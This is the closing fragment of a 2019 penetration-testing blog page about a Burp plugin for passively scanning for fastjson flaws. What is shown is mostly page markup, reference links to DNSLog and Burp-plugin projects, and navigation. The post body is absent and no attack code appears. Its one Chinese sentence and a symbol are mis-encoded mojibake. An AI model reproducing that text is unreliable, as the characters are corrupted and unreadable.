<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™ä¸ªæ–‡ç« å¾ˆç²¾å½©å‘€ï¼Œæ‰€ä»¥è¢«åˆ é™¤äº†å•Š</p>
<p><img src="./images/fastjson1.png"></p>
<ul>
<li><a target="_blank" rel="noopener" href="http://xdxd.love/2015/04/20/burpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8Bpython%E7%AF%87/">http://xdxd.love/2015/04/20/burpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8Bpython%E7%AF%87/</a></li>
<li><a target="_blank" rel="noopener" href="https://thief.one/2018/05/04/1/">https://thief.one/2018/05/04/1/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/lufeirider/Project.git">https://github.com/lufeirider/Project.git</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/bit4woo/DNSLog">https://github.com/bit4woo/DNSLog</a></li>
</ul>

	</div>

	
	<span id="/2019/07/22/fastjson-rce.html" class="leancloud-visitors view" data-flag-title="fastjsonè¢«åŠ¨æ‰«æBurpæ’ä»¶">
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2019/09/17/nginx_path_traversle.html" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2019/07/21/rsyslog-backdoor.html" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2019-07-22 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
